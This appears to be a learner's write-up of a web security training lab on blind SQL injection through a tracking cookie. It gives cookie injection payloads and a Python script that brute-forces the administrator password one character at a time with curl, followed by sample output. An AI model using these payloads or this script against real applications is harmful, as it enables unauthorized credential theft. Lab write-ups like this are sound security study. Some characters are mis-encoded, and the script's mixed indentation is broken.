# The Lab description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes aÂ `Welcome back`Â message in the page if the query returns any rows.

The database contains a different table calledÂ `users`, with columns calledÂ `username`Â andÂ `password`. You need to exploit the blind SQL injection vulnerability to find out the password of theÂ `administrator`Â user.

To solve the lab, log in as theÂ `administrator`Â user.
# Understanding the lab
When i access the lab i find that it works normally till i hit the login or refresh it gives me a `Welcome Back` begind the login icon.
By analyzing the request i found out that there r two cookies
```header
Cookie: TrackingId=e2D1yRgn8a5Q8l8E; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5
```
contains `TrackingId` and `session`.

I assumed that the TrackingId is in an SQL query like `SELECT TrackingId FROM users WHERE TrackingId = <MY COOKIE>;`
So i started testing injecting in there to what happens to the posisive msg `Welcome Back`.
First when i change the id it doesnâ€™t appear so the trackingid is essential.
Then opened burp repeater trying to add something like `...8E' OR '1'='2' --` make it doesnâ€™t appear.
So started hunting.
I started testing the database data the site gave me about the lab 
`8E' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1) > '0'--; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5`

it worked and when changin the test to `< '0'` it doesnâ€™t.
so at first i tried it manually found out that i will not finish so i used the most way i likeâ€¦ scripting.

I made this script to start getting the password
```python
# exploit.py
import subprocess

def getCmd(i, char, sign):
    link = "https://0af900ba04c11a3481b6b15700db0006.web-security-academy.net/"
    cookies = f"Cookie: TrackingId=e2D1yRgn8a5Q8l8E' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{i},1) {sign} '{char}'--; session=OoYYGOLsm9n9NqZ2rLc4r2H4IBvhT8i5" 
    return f"""curl -L "{link}" -H "{cookies}" """
i=1
password = ""
positive = "<div>Welcome back!</div><p>|</p>"

while True:
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        cmd = getCmd(i, char, '=')
        res = subprocess.run(cmd, shell=True, check=True, capture_output=True)
        if res.stdout.decode().find(positive) != -1:
            password += char
            print(f"Password: {password}")
            break
    i += 1
    if subprocess.run(getCmd(i, "", '='), shell=True, check=True, capture_output=True).stdout.decode().find(positive) != -1:
		print("Done!")
        break
```

Then launching get giving me
```python
$ python sqlGuessPassword.py
Password: y
Password: yq
Password: yqc
Password: yqcs
Password: yqcsv
Password: yqcsvs
Password: yqcsvsd

Done
```
